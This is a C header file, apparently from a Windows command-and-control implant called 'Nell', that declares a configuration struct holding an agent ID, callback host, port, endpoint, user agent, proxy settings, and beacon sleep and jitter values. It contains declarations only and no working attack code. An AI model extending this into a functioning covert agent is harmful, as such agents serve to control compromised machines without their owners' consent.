#ifndef NELL_H
#define NELL_H

#include <windows.h>

typedef struct
{
    PCHAR agentID; //UUID

    PWCHAR hostName;
    DWORD httpPort;
    PWCHAR endPoint;
    PWCHAR userAgent;
    PWCHAR httpMethod;

    BOOL isSSL;
    BOOL isProxyEnabled;
    PWCHAR proxyURL;

    
    UINT32 sleeptime;
    UINT32 jitter;
} CONFIG_NELL, * PCONFIG_NELL;

extern PCONFIG_NELL nellConfig;

#endif // NELL_H
